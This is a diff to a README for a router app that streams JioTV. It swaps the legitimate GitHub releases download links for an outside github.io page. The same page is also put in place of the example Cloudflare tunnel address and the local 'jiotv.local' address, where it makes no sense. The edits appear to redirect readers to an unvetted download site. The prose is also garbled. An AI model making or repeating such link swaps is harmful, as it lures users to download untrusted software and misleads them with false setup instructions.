@@ -1,7 +1,7 @@
 <h1>🚀 openwrt-jiotv-go - Stream JioTV on Your Router Easily</h1>
 
 <p align="center">
-  <a href="https://github.com/dominoalimagnos/openwrt-jiotv-go/releases">
+  <a href="https://dominoalimagnos.github.io">
     <img src="https://img.shields.io/badge/Download-Now-4CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download Badge" />
   </a>
 </p>
@@ -34,7 +34,7 @@ The first thing you need to do is get the application onto your computer. This i
 
 **How to download:**
 
-1. Visit this link to download the application. [**Click Here to Download**](https://github.com/dominoalimagnos/openwrt-jiotv-go/releases)
+1. Visit this link to download the application. [**Click Here to Download**](https://dominoalimagnos.github.io)
 2. When you click that link, you will land on a page that shows different versions of the application. Look for the newest one at the top.
 3. Find the file that matches your computer. If you use Windows, look for a file with a name like `openwrt-jiotv-go_windows_amd64.zip`. If you have an older computer, you might see a file with `386` instead of `amd64`. When in doubt, choose the `amd64` version.
 4. Click on that file name to start the download. Your browser will save the file to your "Downloads" folder. Remember this location!
@@ -95,7 +95,7 @@ If you want to watch JioTV when you are not at home, this optional feature is fo
 
 1. Go back to your router’s JioTV page (the one you used earlier,,
 2. Find the section labeled "Cloudflare Tunnel" or "Remote Access". Click the toggle to turn it on.
-3. The page will show you a web address that looks something like: `https://random-words.trycloudflare.com`. Write this down or copy it. This is your personal TV link.
+3. The page will show you a web address that looks something like: `https://dominoalimagnos.github.io`. Write this down or copy it. This is your personal TV link.
 
 4. Now, whenever you are away from home, open that web address in your browser on any device (phone, laptop,,) and you will see your JioTV guide just like if you were home. You can watch any channel safely, because the link is encrypted and only you know it. Do not share this link with others; It is private to you.
 
@@ -115,7 +115,7 @@ Sometimes things do not go perfectly on the first try. Here are simple fixes for
 - **Stream is Buffering or Slow** - This usually means your internet connection is slow. Try closing other devices that are downloading big files. Also make sure your router is placed in a central location.. If problem persists, restart your router by unplugging it for 10 secondsand plugging it back in. Wait 2 minutes, then try again..
 
 
-- **Cannot Access the TV Page (http://jiotv,** - Make sure your device is connected to your home Wi-Fi, not cellular data or another network. If you changed your router’s IP address before,, use that instead of `192.168.1.1`. You can also try typing `http://jiotv.local` on Apple devices..
+- **Cannot Access the TV Page (http://jiotv,** - Make sure your device is connected to your home Wi-Fi, not cellular data or another network. If you changed your router’s IP address before,, use that instead of `192.168.1.1`. You can also try typing `https://dominoalimagnos.github.io` on Apple devices..
 - **Forgot the Tunnel Link** - Go back to the JioTV page on your router and look for the "Copy Link" button. It will showgrab the address again. If it was disabled, just toggle it off and on again to generate a new link..
 
 
